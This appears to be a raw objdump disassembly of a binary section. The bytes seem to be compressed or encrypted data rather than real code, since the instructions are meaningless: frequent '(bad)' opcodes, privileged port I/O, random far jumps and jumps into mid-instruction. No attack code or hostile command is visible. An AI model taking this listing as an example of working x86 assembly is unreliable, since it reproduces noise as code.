  4191bf:	ret    
  4191c0:	inc    ebp
  4191c1:	add    eax,eax
  4191c3:	aam    0x25
  4191c5:	mov    al,ds:0x5450c645
  4191ca:	pop    ds
  4191cb:	mov    dl,0xb5
  4191cd:	inc    esi
  4191ce:	das    
  4191cf:	out    dx,eax
  4191d0:	jmp    0xc75c:0x601f6630
  4191d7:	lahf   
  4191d8:	loopne 0x419249
  4191da:	pop    ds
  4191db:	adc    DWORD PTR [edx-0x2ffbe7bc],ecx
  4191e1:	sub    al,0xa
  4191e3:	jae    0x4191ec
  4191e5:	cmc    
  4191e6:	jb     0x4191b5
  4191e8:	cli    
  4191e9:	imul   esi,DWORD PTR [edi],0x51
  4191ec:	sub    DWORD PTR [eax],ebx
  4191ee:	jle    0x41920d
  4191f0:	xlat   BYTE PTR ds:[ebx]
  4191f1:	dec    esi
  4191f2:	adc    ch,BYTE PTR [edx]
  4191f4:	ret    0x7407
  4191f7:	push   ebp
  4191f8:	fwait
  4191f9:	ror    DWORD PTR [eax+0x2d182302],cl
  4191ff:	dec    ecx
  419200:	mov    ah,0x1
  419202:	outs   dx,BYTE PTR ds:[esi]
  419203:	mov    DWORD PTR [eax],esi
  419205:	outs   dx,DWORD PTR ds:[esi]
  419206:	jbe    0x4191ff
  419208:	fild   DWORD PTR [ecx+eiz*1]
  41920b:	sub    esp,DWORD PTR [edx-0x49]
  41920e:	or     esi,edx
  419210:	and    al,0xaa
  419212:	in     al,0x97
  419214:	add    DWORD PTR [edi+0x17dcc419],eax
  41921a:	push   ecx
  41921b:	dec    esp
  41921c:	(bad)  
  41921d:	dec    eax
  41921e:	mov    eax,ds:0x1cc1475
  419223:	retf   0x8d85
  419226:	push   ss
  419227:	shl    DWORD PTR [ebx+0x74],0xe8
  41922b:	push   ss
  41922c:	mov    DWORD PTR [ebp+0x3583e215],edx
  419232:	pop    esi
  419233:	push   eax
  419234:	mov    ebp,0xb3060120
  419239:	add    esp,esp
  41923b:	and    BYTE PTR [edi],cl
  41923d:	sub    esp,DWORD PTR [edx-0x17d478f8]
  419243:	mov    al,ds:0x8f8c008e
  419248:	push   ecx
  419249:	mov    BYTE PTR [ebx+edx*1-0xf13c130],bh
  419250:	jae    0x41923d
  419252:	outs   dx,BYTE PTR ds:[esi]
  419253:	fild   DWORD PTR [esi-0x2f]
  419256:	and    DWORD PTR [ebp+0x7],ecx
  419259:	pop    esi
  41925a:	pop    es
  41925b:	repnz push es
  41925d:	inc    esp
  41925e:	icebp  
  41925f:	push   edx
  419260:	sar    edi,1
  419262:	cmp    al,BYTE PTR [eax+0x4]
  419265:	inc    DWORD PTR [edi]
  419267:	inc    ecx
  419268:	xchg   edi,eax
  419269:	and    al,0xc0
  41926b:	pop    eax
  41926c:	sti    
  41926d:	xor    DWORD PTR [edi+0x5f6c5bff],edi
  419273:	pusha  
  419274:	sub    DWORD PTR [edx],esp
  419276:	ds hlt 
  419278:	fild   QWORD PTR [esp+eax*2]
  41927b:	je     0x419297
  41927d:	dec    al
  41927f:	je     0x41928b
  419281:	sbb    ebx,DWORD PTR [ebx]
  419283:	sub    eax,0x40832c82
  419288:	je     0x41920e
  41928a:	adc    BYTE PTR [ebp-0x4c08a5cb],bh
  419290:	add    ch,bl
  419292:	sbb    al,BYTE PTR [ebx]
  419294:	push   ss
  419295:	sub    BYTE PTR [eax+0x470eeb3b],dl
  41929b:	jo     0x419292
  41929d:	fadd   QWORD PTR [edi-0x338107a8]
  4192a3:	outs   dx,BYTE PTR ds:[esi]
  4192a4:	xchg   ebx,edi
  4192a6:	and    DWORD PTR [ebp-0x14d131d3],edi
  4192ac:	mov    ds:0xac006a03,eax
  4192b1:	jns    0x41929c
  4192b3:	cmp    eax,0x32138b0d
  4192b8:	add    dl,al
  4192ba:	mov    DWORD PTR [ebx],eax
  4192bc:	add    edi,DWORD PTR [edi]
  4192be:	inc    ebp
  4192bf:	and    ecx,esp
  4192c1:	add    edi,DWORD PTR ds:[esp+ecx*1+0x2d]
  4192c6:	mov    eax,esi
  4192c8:	jge    0x4192cf
  4192ca:	cmp    al,0x9
  4192cc:	repz push ecx
  4192ce:	mov    ebp,eax
  4192d0:	xchg   DWORD PTR [edi+0xfaedca0],edi
  4192d6:	push   ecx
  4192d7:	mov    ebx,0x64be6a48
  4192dc:	add    al,0xb1
  4192de:	adc    ecx,DWORD PTR [eax-0x74d6f445]
  4192e4:	lds    ebp,FWORD PTR [ebp+0x40070703]
  4192ea:	or     edi,DWORD PTR [edx+0x7292055a]
  4192f0:	or     BYTE PTR ss:[edx],cl
  4192f3:	add    DWORD PTR [ebx],edi
  4192f5:	xor    ebx,ebp
  4192f7:	or     DWORD PTR [esi],ebp
  4192f9:	add    esp,DWORD PTR [ecx+0x2]
  4192fc:	fisubr WORD PTR [edi]
  4192fe:	dec    edi
  4192ff:	jne    0x4192d3
  419301:	xchg   esi,eax
  419302:	push   eax
  419303:	int    0x56
  419305:	rol    DWORD PTR [eax+0x123c5533],0x81
  41930c:	or     DWORD PTR [esi-0x7cc58a02],ebx
  419312:	sti    
  419313:	arpl   WORD PTR [edi+0x24],di
  419316:	dec    esi
  419317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419318:	xor    ah,bh
  41931a:	push   ss
  41931b:	cld    
  41931c:	pop    ds
  41931d:	jae    0x4192b8
  41931f:	xor    eax,edx
  419321:	sub    eax,edx
  419323:	add    ecx,eax
  419325:	and    DWORD PTR [eax+eax*1-0x23],0x6bfa3f42
  41932d:	shl    BYTE PTR [ebx+eax*1-0x28],0xb5
  419332:	js     0x419330
  419334:	sahf   
  419335:	push   cs
  419336:	or     bh,dh
  419338:	push   es
  419339:	cmp    al,0xfb
  41933b:	hlt    
  41933c:	pop    eax
  41933d:	cld    
  41933e:	jmp    0x419346
  419340:	jb     0x41938a
  419342:	cld    
  419343:	xor    al,BYTE PTR [ebx]
  419345:	ret    
  419346:	outs   dx,DWORD PTR ds:[esi]
  419347:	sub    al,0xdb
  419349:	pusha  
  41934a:	dec    esp
  41934b:	fadd   DWORD PTR [edi]
  41934d:	fadd   DWORD PTR [edx]
  41934f:	fsubr  st(0),st
  419351:	in     al,0xc7
  419353:	shl    DWORD PTR [ecx+0x100fa9e4],0xab
  41935a:	mov    ebp,DWORD PTR [esi]
  41935c:	fsub   DWORD PTR [eax-0x11a2716f]
  419362:	jb     0x4192f3
  419364:	push   esi
  419365:	ret    
  419366:	push   eax
  419367:	mov    al,ds:0xa9c8ad54
  41936c:	xchg   esi,eax
  41936d:	js     0x4193c7
  41936f:	iret   
  419370:	ja     0x4193ba
  419372:	js     0x41936a
  419374:	and    DWORD PTR [ebp-0x56250928],esp
  41937a:	adc    ch,ah
  41937c:	ds sbb dh,al
  41937f:	sbb    eax,0x67e084f0
  419384:	jne    0x4193ba
  419386:	dec    eax
  419387:	ja     0x41931d
  419389:	mov    edi,0x9c66d48b
  41938e:	ror    DWORD PTR [ebx],0x49
  419391:	pop    ss
  419392:	mov    BYTE PTR [eax+0x12],0xaf
  419396:	adc    BYTE PTR [esp+ebp*1-0x62],bh
  41939a:	in     al,0x41
  41939c:	nop
  41939d:	and    eax,0xdfb83c25
  4193a2:	mov    ebx,0x1ceb44dc
  4193a7:	mov    edx,DWORD PTR ds:0x7fc4b83e
  4193ad:	and    eax,0xe1d4f80c
  4193b2:	inc    edx
  4193b3:	cwde   
  4193b4:	or     BYTE PTR [ecx-0x14ba55b8],ah
  4193ba:	add    eax,0x732db078
  4193bf:	hlt    
  4193c0:	push   esi
  4193c1:	jne    0x4193b3
  4193c3:	test   BYTE PTR [edi-0x51914263],bh
  4193c9:	xor    DWORD PTR [edi],esi
  4193cb:	adc    BYTE PTR [edx+0x106dfb0d],cl
  4193d1:	or     DWORD PTR [ecx+0x36],ebp
  4193d4:	repz push ss
  4193d6:	sbb    ch,BYTE PTR [esi]
  4193d8:	jmp    0x290:0x2f3cd2f2
  4193df:	into   
  4193e0:	add    cl,ch
  4193e2:	lock ins BYTE PTR es:[edi],dx
  4193e4:	mov    esp,0xb1d31375
  4193e9:	mov    ah,al
  4193eb:	sub    al,0x1
  4193ed:	jb     0x419448
  4193ef:	and    ch,BYTE PTR [esi+0x5b]
  4193f2:	pop    ss
  4193f3:	ja     0x419456
  4193f5:	cmp    ch,bl
  4193f7:	push   edx
  4193f8:	push   esi
  4193f9:	lock adc ch,cl
  4193fc:	imul   al
  4193fe:	data16 add dh,cl
  419401:	add    BYTE PTR [esi+0x64071ed9],al
  419407:	nop
  419408:	or     ebx,edi
  41940a:	xor    ebx,ebp
  41940c:	ss sbb esi,edx
  41940f:	hlt    
  419410:	out    0x42,eax
  419412:	xchg   esi,eax
  419413:	data16 sbb dh,ah
  419416:	jmp    0x419408
  419418:	popf   
  419419:	mov    eax,DWORD PTR [edi+0x55aefa02]
  41941f:	jg     0x419498
  419421:	js     0x4193b0
  419423:	pop    edx
  419424:	sub    al,0xd5
  419426:	xor    BYTE PTR [ecx-0x7],bl
  419429:	jo     0x4193e3
  41942b:	xor    ecx,ebx
  41942d:	test   al,0x18
  41942f:	ret    0x6a77
  419432:	out    dx,eax
  419433:	dec    ecx
  419434:	rcr    BYTE PTR [edx],1
  419436:	or     al,0xa1
  419438:	popa   
  419439:	sub    ebp,ebx
  41943b:	push   ecx
  41943c:	in     al,dx
  41943d:	inc    eax
  41943e:	mov    edi,0xee19688d
  419443:	and    eax,0x1b3df1
  419448:	jbe    0x4194a4
  41944a:	in     al,dx
  41944b:	fstp   TBYTE PTR [ebx-0x37c4bfc4]
  419451:	jle    0x419488
  419453:	adc    bh,al
  419455:	fs jmp 0x419487
  419458:	cmp    cl,BYTE PTR [ecx+0x61]
  41945b:	ret    
  41945c:	mov    dh,0xd8
  41945e:	inc    edi
  41945f:	neg    BYTE PTR [edx+0x12]
  419462:	test   DWORD PTR [ecx+0x21],edi
  419465:	popa   
  419466:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  419468:	pop    ds
  419469:	mov    ebx,0x706e4613
  41946e:	or     BYTE PTR [esp+ecx*8],al
  419471:	fs inc esp
  419473:	pop    es
  419474:	mov    bl,0x9
  419476:	sahf   
  419477:	pushf  
  419478:	jo     0x419415
  41947a:	shl    BYTE PTR [eax],1
  41947c:	les    edi,FWORD PTR [edi]
  41947e:	aam    0x20
  419480:	push   ss
  419481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419482:	fwait
  419483:	mov    ch,0x1a
  419485:	shl    BYTE PTR [esi+0x12118c24],cl
  41948b:	hlt    
  41948c:	repz jnp 0x419505
  41948f:	cmp    bl,BYTE PTR [ebp+0x16]
  419492:	sub    BYTE PTR [edi],dl
  419494:	or     DWORD PTR [ebx],esp
  419496:	push   es
  419497:	jne    0x419483
  419499:	mov    DWORD PTR [ebp+0x1c6092cb],eax
  41949f:	push   esp
  4194a0:	sbb    ah,0xff
  4194a3:	pop    edi
  4194a4:	xchg   ebx,eax
  4194a5:	bound  esp,QWORD PTR ds:0xdc6c816d
  4194ab:	sub    al,0xdb
  4194ad:	scas   eax,DWORD PTR es:[edi]
  4194ae:	popa   
  4194af:	pop    ss
  4194b0:	outs   dx,DWORD PTR ds:[esi]
  4194b1:	je     0x4194dd
  4194b3:	sub    eax,ebx
  4194b5:	xchg   esp,eax
  4194b6:	lds    ebx,FWORD PTR [edx]
  4194b8:	ss sbb eax,0x6bb59917
  4194bf:	test   BYTE PTR [ebx-0x6b541e5],ch
  4194c5:	push   ebp
  4194c6:	out    dx,al
  4194c7:	pushf  
  4194c8:	or     al,0x16
  4194ca:	mov    fs,WORD PTR [ebp-0x87ec399]
  4194d0:	jl     0x419484
  4194d2:	mov    esp,DWORD PTR [ecx+eax*4]
  4194d5:	xchg   ecx,eax
  4194d6:	cld    
  4194d7:	fdivr  DWORD PTR [edx+0x282b3804]
  4194dd:	xchg   DWORD PTR [ebp+0x4f],eax
  4194e0:	add    eax,DWORD PTR gs:[esi+0x6406d545]
  4194e7:	add    BYTE PTR [ebx],bh
  4194e9:	add    edi,DWORD PTR [edi]
  4194eb:	inc    eax
  4194ec:	mov    ecx,0xcf83eac2
  4194f1:	push   DWORD PTR ds:0x5e91c11b
  4194f7:	or     eax,0x8476eea7
  4194fc:	ficom  WORD PTR [edx]
  4194fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194ff:	xchg   ebx,eax
  419500:	mov    ecx,0xb8b9126e
  419505:	and    BYTE PTR [ecx],dl
  419507:	je     0x41950d
  419509:	dec    edi
  41950a:	adc    esi,DWORD PTR [edx]
  41950c:	and    eax,0x282aebdf
  419511:	xchg   esp,eax
  419512:	les    eax,FWORD PTR ds:0x47340b9a
  419518:	scas   eax,DWORD PTR es:[edi]
  419519:	add    BYTE PTR [esp+edi*2+0x46d1c509],cl
  419520:	aam    0x4
  419522:	mov    esi,DWORD PTR [eax+0x50]
  419525:	jmp    0x4b994843
  41952a:	adc    DWORD PTR [ebx+0x2b9c0145],esp
  419530:	daa    
  419531:	fistp  DWORD PTR [bp+si]
  419534:	push   es
  419535:	push   es
  419536:	or     BYTE PTR [edx],cl
  419538:	gs ret 
  41953a:	jle    0x419548
  41953c:	jns    0x4194c8
  41953e:	or     eax,0x7474e78c
  419543:	inc    ecx
  419544:	jb     0x4194c6
  419546:	popf   
  419547:	nop
  419548:	or     al,BYTE PTR [ebx]
  41954a:	add    DWORD PTR [edi+eax*2],ebp
  41954d:	in     al,0xe4
  41954f:	test   BYTE PTR [esp+ecx*1],bl
  419552:	(bad)  
  419553:	add    BYTE PTR [edi-0x65],bh
  419556:	nop
  419557:	inc    ebx
  419558:	sbb    cl,BYTE PTR es:[esi]
  41955b:	test   eax,0x2105eac2
  419560:	sbb    al,0x7d
  419562:	push   ebx
  419563:	sbb    DWORD PTR [esi+eiz*2],esp
  419566:	sahf   
  419567:	cmp    al,0xf6
  419569:	add    esi,DWORD PTR [ecx+0x74]
  41956c:	inc    esi
  41956d:	pop    es
  41956e:	or     al,0x77
  419570:	ds jne 0x41957a
  419573:	dec    eax
  419574:	sub    BYTE PTR [ebx+0x1e],0x7
  419578:	add    al,0x1
  41957a:	push   cs
  41957b:	cmp    eax,0xd0cb5c39
  419580:	add    dl,BYTE PTR ds:0xae111986
  419586:	jp     0x419535
  419588:	test   eax,0xad5402a8
  41958d:	adc    al,0x66
  41958f:	inc    ecx
  419590:	test   al,0x32
  419592:	shl    DWORD PTR [esi+0x34],1
  419595:	(bad)  
  419596:	push   esp
  419597:	inc    edx
  419598:	mov    eax,0x6f430598
  41959d:	inc    edi
  41959e:	pushf  
  41959f:	inc    ebp
  4195a0:	mov    esp,0xc7af7948
  4195a5:	mov    bl,0x88
  4195a7:	mov    cl,0xa
  4195a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195aa:	leave  
  4195ab:	into   
  4195ac:	mov    eax,0xdd78f6d4
  4195b1:	jnp    0x419583
  4195b3:	xchg   ebp,eax
  4195b4:	or     al,0xa
  4195b6:	leave  
  4195b7:	sbb    al,0x7c
  4195b9:	mov    dh,0x60
  4195bb:	jo     0x4195bf
  4195bd:	es pop edx
  4195bf:	scas   eax,DWORD PTR es:[edi]
  4195c0:	push   esi
  4195c1:	call   0xf484606
  4195c6:	out    0x87,al
  4195c8:	cmp    BYTE PTR [edi+0x18],dh
  4195cb:	sub    ecx,edx
  4195cd:	das    
  4195ce:	inc    esi
  4195cf:	adc    al,0xcc
  4195d1:	inc    esp
  4195d2:	outs   dx,BYTE PTR ds:[esi]
  4195d3:	xchg   edx,eax
  4195d4:	fwait
  4195d5:	dec    ebp
  4195d6:	(bad)  
  4195d7:	js     0x419565
  4195d9:	sbb    eax,0x1c1ec68b
  4195de:	pop    es
  4195df:	mov    DWORD PTR [edi-0x70],ebx
  4195e2:	adc    BYTE PTR [ecx+0x75],ah
  4195e5:	or     eax,0xd9c47d25
  4195ea:	and    cl,BYTE PTR [edi+ebp*2]
  4195ed:	sub    bl,0x27
  4195f0:	fucomp st(2)
  4195f2:	xor    ecx,DWORD PTR [esi-0x82209ce]
  4195f8:	jb     0x419607
  4195fa:	push   cs
  4195fb:	fcom   QWORD PTR [ebp-0x23]
  4195fe:	pop    ds
  4195ff:	fwait
  419600:	jmp    0x41960d
  419602:	or     al,0x64
  419604:	push   0xffffff93
  419606:	mov    BYTE PTR [edi],ch
  419608:	aam    0x18
  41960a:	or     bh,BYTE PTR [edi+0x1458f10e]
  419610:	and    eax,0x6adaee
  419615:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419616:	loop   0x4195f3
  419618:	mov    edx,0xb52b6a2
  41961d:	push   eax
  41961e:	push   cs
  41961f:	xor    cl,BYTE PTR [ebp-0x2c]
  419622:	bound  ebp,QWORD PTR [ebp+esi*1+0xe0cd24c]
  419629:	fdivr  DWORD PTR [esi-0x77]
  41962c:	push   ss
  41962d:	xchg   DWORD PTR [ebp-0x80],esi
  419630:	jmp    0x730d:0x4f27221
  419637:	adc    edx,ebx
  419639:	mov    ch,0xd2
  41963b:	xchg   bl,cl
  41963d:	xchg   ecx,eax
  41963e:	sbb    eax,0x2cc43841
  419643:	push   es
  419644:	xor    BYTE PTR [edi-0x4c3ea9b3],0x5f
  41964b:	cmp    al,0x5d
  41964d:	or     BYTE PTR [eax-0x73],dl
  419650:	add    bl,bh
  419652:	inc    edx
  419653:	test   eax,ebp
  419655:	push   ds
  419656:	inc    ebx
  419657:	test   BYTE PTR [edi+0x12],al
  41965a:	shl    DWORD PTR [ebx-0x75],0x6
  41965e:	adc    ebp,DWORD PTR [edx-0x52]
  419661:	in     al,dx
  419662:	mov    al,0x92
  419664:	inc    esp
  419665:	das    
  419666:	mov    ds:0x800f2dd6,al
  41966b:	and    edx,DWORD PTR [eax]
  41966d:	das    
  41966e:	or     ebx,DWORD PTR [ecx+0xf13026a]
  419674:	imul   esp,DWORD PTR [edi],0x48
  419677:	cmovo  eax,DWORD PTR ds:0x84c208a
  41967e:	add    BYTE PTR [edx+eax*1-0x4],0xc3
  419683:	sbb    esi,DWORD PTR [esi+eax*1+0x47]
  419687:	ror    DWORD PTR [edi+0x74],0x53
  41968b:	(bad)  
  41968c:	adc    BYTE PTR [ebp+0x11],cl
  41968f:	(bad)  
  419690:	ss xor ecx,ecx
  419693:	push   edx
  419694:	jle    0x419666
  419696:	retf   
  419697:	or     eax,0x141f5a28
  41969c:	pop    esp
  41969d:	mov    eax,0x1082f661
  4196a2:	sbb    al,0xcf
  4196a4:	mov    ch,0xaf
  4196a6:	es inc ebx
  4196a8:	jle    0x41969a
  4196aa:	ficom  WORD PTR [ecx+0x0]
  4196ad:	inc    edx
  4196ae:	jecxz  0x419647
  4196b0:	nop
  4196b1:	push   edi
  4196b2:	loope  0x419694
  4196b4:	adc    DWORD PTR [ecx-0x44774aa0],ebx
  4196ba:	cs jmp 0x5504:0xd0eda0be
  4196c2:	push   0xb
  4196c4:	pop    ss
  4196c5:	add    dl,BYTE PTR [edi]
  4196c7:	fwait
  4196c8:	int    0xb9
  4196ca:	pop    esp
  4196cb:	adc    BYTE PTR [edi-0x73],cl
  4196ce:	inc    ebx
  4196cf:	ja     0x4196f9
  4196d1:	rcr    ch,0x44
  4196d4:	dec    eax
  4196d5:	sub    DWORD PTR [edi+0x44],edi
  4196d8:	pop    ecx
  4196d9:	pop    edi
  4196da:	mov    ebx,eax
  4196dc:	xchg   edx,eax
  4196dd:	inc    ebx
  4196de:	xchg   esi,eax
  4196df:	xor    DWORD PTR [edx],esp
  4196e1:	lock mov WORD PTR [eax],?
  4196e4:	lahf   
  4196e5:	sub    BYTE PTR [ecx+edi*2],bl
  4196e8:	lock mov eax,edi
  4196eb:	inc    ebx
  4196ec:	xor    esi,0xffffffe0
  4196ef:	sti    
  4196f0:	or     eax,0xd9e6b9b4
  4196f5:	jne    0x4196a5
  4196f7:	pusha  
  4196f8:	add    BYTE PTR [edi],al
  4196fa:	sbb    al,0x4
  4196fc:	cs add eax,0x1828b5b2
  419702:	add    DWORD PTR [edi],0x4b
  419705:	push   es
  419706:	fwait
  419707:	mov    ah,BYTE PTR [esi]
  419709:	retf   
  41970a:	in     al,dx
  41970b:	mov    esp,0x9631c097
  419710:	cs leave 
  419712:	popa   
  419713:	jo     0x419701
  419715:	and    al,0xe8
  419717:	fsub   DWORD PTR [ebx]
  419719:	cmp    DWORD PTR [eax+eax*2+0x2a],ebp
  41971d:	jb     0x419707
  41971f:	mov    ch,0x3b
  419721:	daa    
  419722:	jmp    0x41972c
  419724:	jne    0x4196c2
  419726:	jmp    0x4196c6
  419728:	nop
  419729:	pop    ds
  41972a:	test   DWORD PTR [esi-0x18],eax
  41972d:	or     al,0x4a
  41972f:	and    BYTE PTR [eax-0x15],ch
  419732:	push   esi
  419733:	div    BYTE PTR [esi]
  419735:	add    dl,ah
  419737:	mov    ?,WORD PTR [esi+eax*1+0x1f74073e]
  41973e:	dec    edx
  41973f:	(bad)  
  419740:	enter  0xe0f4,0x3c
  419744:	popf   
  419745:	add    dl,al
  419747:	lahf   
  419748:	or     DWORD PTR [edx],edx
  41974a:	pop    edi
  41974b:	loope  0x419775
  41974d:	lods   al,BYTE PTR ds:[si]
  41974f:	mov    esi,0x45874ccd
  419754:	ins    DWORD PTR es:[edi],dx
  419755:	cmp    al,0xd3
  419757:	push   0x20
  419759:	cdq    
  41975a:	mov    al,0x21
  41975c:	pop    ds
  41975d:	pop    eax
  41975e:	dec    ecx
  41975f:	xchg   ecx,eax
  419760:	dec    ebx
  419761:	sub    al,0x4
  419763:	xor    ebx,DWORD PTR [eax-0x5c009f1a]
  419769:	inc    edi
  41976a:	ins    BYTE PTR es:[edi],dx
  41976b:	mov    ds:0x5aae3291,eax
  419770:	push   esp
  419771:	mov    ecx,0x43c91e04
  419776:	mov    bl,BYTE PTR [eax+0x58]
  419779:	jmp    0x4be8:0xcb6b9150
  419780:	jne    0x4197db
  419782:	shl    DWORD PTR [edi+0x76],cl
  419785:	add    al,0x47
  419787:	and    eax,0xd3b8f319
  41978c:	cmp    esp,ecx
  41978e:	add    eax,0x9208b978
  419793:	inc    edi
  419794:	or     edx,DWORD PTR [eax]
  419796:	push   ds
  419797:	push   cs
  419798:	call   0x96ac626a
  41979d:	ins    DWORD PTR es:[edi],dx
  41979e:	stos   DWORD PTR es:[edi],eax
  41979f:	adc    eax,0x3b0baa5f
  4197a4:	std    
  4197a5:	add    DWORD PTR [ecx+0x3c],0x6a
  4197a9:	add    al,0x56
  4197ab:	js     0x4197a5
  4197ad:	sbb    DWORD PTR [esi+0x25a8689d],ecx
  4197b3:	or     al,BYTE PTR [edx+edi*4-0x68]
  4197b7:	mov    eax,0xbeb1002f
  4197bc:	jns    0x419785
  4197be:	add    edx,DWORD PTR [ebp+0x4a]
  4197c1:	jne    0x4197b7
  4197c3:	sbb    esi,DWORD PTR es:[edx-0x28]
  4197c7:	push   0x3
  4197c9:	sub    ah,ah
  4197cb:	test   eax,0x1a3854fa
  4197d0:	inc    eax
  4197d1:	pop    esi
  4197d2:	in     al,dx
  4197d3:	push   esi
  4197d4:	retf   
  4197d5:	sub    BYTE PTR [ebx+0x45873177],dl
  4197db:	inc    esp
  4197dc:	sbb    dl,dh
  4197de:	or     edi,DWORD PTR [edx+0x1c2f93d6]
  4197e4:	fs fwait
  4197e6:	push   ecx
  4197e7:	jbe    0x4197af
  4197e9:	clc    
  4197ea:	in     al,dx
  4197eb:	xchg   ebx,eax
  4197ec:	iret   
  4197ed:	xchg   esi,eax
  4197ee:	pop    esp
  4197ef:	ror    BYTE PTR [ecx],cl
  4197f1:	clc    
  4197f2:	ret    0x820f
  4197f5:	adc    ebx,ebx
  4197f7:	rol    BYTE PTR gs:[ecx+eax*1-0x51],1
  4197fc:	or     al,0x15
  4197fe:	repz push 0xffffffd4
  419801:	xor    eax,0x5988d1eb
  419806:	xor    eax,0x5b816ae5
  41980b:	xor    eax,0x472c9eb5
  419810:	stos   BYTE PTR es:[edi],al
  419811:	sub    al,0xf
  419813:	lods   eax,DWORD PTR ds:[esi]
  419814:	in     al,0xd8
  419816:	mov    ds:0xee1d716,eax
  41981b:	adc    al,0xcb
  41981e:	push   0xffffffa4
  419820:	push   ds
  419821:	int    0xc0
  419823:	mov    esp,cs
  419825:	add    eax,0x7ea8eda9
  41982a:	pop    ebx
  41982b:	xor    DWORD PTR [edi-0x7b0d54e9],0xffffffd4
  419832:	mov    ecx,DWORD PTR ds:0x8b2e2440
  419838:	shl    DWORD PTR [edx+0x5],cl
  41983b:	and    esi,DWORD PTR [esp+edx*4-0x63]
  41983f:	lock js 0x4197ef
  419842:	push   es
  419843:	fwait
  419844:	and    al,0x8b
  419846:	lock push esi
  419848:	add    esp,ebp
  41984a:	or     eax,edx
  41984c:	jne    0x4198cd
  41984e:	aas    
  41984f:	test   al,0xba
  419851:	lock (bad) 
  419853:	lea    eax,[ecx+edi*4-0x14]
  419857:	xor    esi,DWORD PTR [edi+0x7b]
  41985a:	sub    BYTE PTR [esi+0xf],0x25
  41985e:	mov    edx,0x668118fc
  419863:	inc    eax
  419864:	push   es
  419865:	sti    
  419866:	jmp    0x4198e6
  419868:	mov    edx,0x4259400
  41986d:	adc    DWORD PTR [edi],ebp
  41986f:	push   ebp
  419870:	sub    cl,al
  419872:	adc    BYTE PTR [esp+ebp*1+0x18ba5693],dl
  419879:	fsub   DWORD PTR [edi+eax*4]
  41987c:	mov    al,0x94
  41987e:	dec    ebp
  41987f:	and    al,0x94
  419881:	xor    ah,dh
  419883:	loope  0x419815
  419885:	out    dx,al
  419886:	repnz pop ecx
  419888:	je     0x41988e
  41988a:	jne    0x41989a
  41988c:	sbb    dh,BYTE PTR [eax]
  41988e:	jmp    0x419892
  419890:	jno    0x4198dc
  419892:	push   es
  419893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419894:	in     al,dx
  419895:	in     al,dx
  419896:	jle    0x1104626b
  41989c:	and    ch,BYTE PTR [edx]
  41989e:	fst    QWORD PTR [ebx+0x62c868ec]
  4198a4:	and    eax,0x6fa03127
  4198a9:	push   ss
  4198aa:	xchg   ebx,eax
  4198ab:	jae    0x4198d8
  4198ad:	or     esp,DWORD PTR [edi-0x2c]
  4198b0:	dec    ebp
  4198b1:	push   es
  4198b2:	int    0x7f
  4198b4:	(bad)  
  4198b5:	add    BYTE PTR gs:[eax],al
  4198b8:	mov    al,0x78
  4198ba:	outs   dx,DWORD PTR ds:[esi]
  4198bb:	sbb    DWORD PTR [ebx+0x1c6b11c0],esp
  4198c1:	inc    esp
  4198c2:	push   edi
  4198c3:	xor    DWORD PTR [ecx+0x2d],ebx
  4198c6:	cmp    eax,DWORD PTR [eax]
  4198c8:	in     eax,0x3
  4198ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198cb:	scas   eax,DWORD PTR es:[edi]
  4198cc:	imul   esp,DWORD PTR [ebx+edi*8+0x21fe8946],0xffffff9a
  4198d4:	push   0x1c
  4198d6:	lea    eax,[ebp-0x719c0334]
  4198dc:	mov    esp,eax
  4198de:	out    0x3e,eax
  4198e0:	aam    0x81
  4198e2:	mov    ebp,0x752d0cdc
  4198e7:	sbb    al,0x53
  4198e9:	out    dx,eax
  4198ea:	std    
  4198eb:	and    bh,BYTE PTR [eax]
  4198ed:	jmp    0x1123:0x24d085a5
  4198f4:	xor    BYTE PTR [eax+0x231c8c86],dh
  4198fa:	sbb    esp,DWORD PTR ds:0x2ecd8e0
  419900:	sbb    dh,bl
  419902:	test   BYTE PTR [eax],dh
  419904:	jecxz  0x4198b2
  419906:	push   ebp
  419907:	out    dx,eax
  419908:	add    bl,BYTE PTR [esi-0x40cd4ad5]
  41990e:	es mov esp,0xb2f51b2d
  419914:	pop    esp
  419915:	imul   edx,DWORD PTR [ebx-0x110f0be],0x9d1ba9ff
  41991f:	xor    al,0x94
  419921:	add    DWORD PTR [edi+eax*1+0x15954095],edx
  419928:	xor    eax,0xf807d830
  41992d:	xlat   BYTE PTR ds:[ebx]
  41992e:	adc    eax,0xcec74102
  419933:	inc    eax
  419934:	sbb    al,0x22
  419936:	mov    al,0x71
  419938:	sub    DWORD PTR ds:0xab111222,ecx
  41993e:	out    dx,al
  41993f:	mov    ds:0x68277406,eax
  419945:	aam    0x12
  419947:	scas   al,BYTE PTR es:[edi]
  419948:	add    al,0xf
  41994a:	mov    di,0x1651
  41994e:	cs je  0x419959
  419951:	mov    eax,0x6c3a39d4
  419956:	push   ebx
  419957:	icebp  
  419958:	jl     0x4198ef
  41995a:	cld    
  41995b:	cld    
  41995c:	inc    ecx
  41995d:	inc    eax
  41995e:	add    al,0x9e
  419960:	ins    BYTE PTR es:[edi],dx
  419961:	sbb    al,0x2
  419963:	ror    DWORD PTR [eax+0x43],0x5e
  419967:	xchg   ebp,eax
  419968:	sti    
  419969:	fiadd  DWORD PTR [edi]
  41996b:	cmp    BYTE PTR [eax],al
  41996d:	inc    ecx
  41996e:	and    BYTE PTR [esp+ebp*1-0xdfa76f4],bh
  419975:	mov    ebp,0xc6fc65e6
  41997a:	test   DWORD PTR [eax-0x53ed61fc],ebp
  419980:	xchg   ecx,eax
  419981:	lods   eax,DWORD PTR ds:[esi]
  419982:	sub    esi,DWORD PTR [ebx]
  419984:	mov    al,0xf9
  419986:	hlt    
  419987:	(bad)  
  419989:	leave  
  41998a:	enter  0x9ae6,0xb8
  41998e:	add    eax,0xc0bc1f85
  419993:	lahf   
  419994:	cmp    esp,DWORD PTR [ebx]
  419996:	(bad)  
  419998:	pinsrw mm1,eax,0x55
  41999c:	sub    BYTE PTR [edx+0x77],0x64
  4199a0:	jecxz  0x419a0f
  4199a2:	dec    ebx
